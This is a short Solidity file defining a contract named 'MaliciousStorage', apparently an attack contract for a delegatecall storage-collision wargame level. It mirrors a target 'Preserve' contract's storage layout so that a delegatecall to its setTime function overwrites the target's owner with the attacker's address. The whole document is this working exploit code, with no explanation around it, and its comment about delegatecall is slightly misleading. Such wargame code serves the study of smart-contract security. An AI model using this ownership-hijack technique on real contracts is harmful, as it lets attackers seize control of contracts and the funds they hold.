pragma solidity ^0.8.0;
contract MaliciousStorage {

    // Storage layout matches original Preserve contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _newTimestamp) public {
        // Use delegatecall to set owner to msg.sender
        owner = msg.sender;
    }
}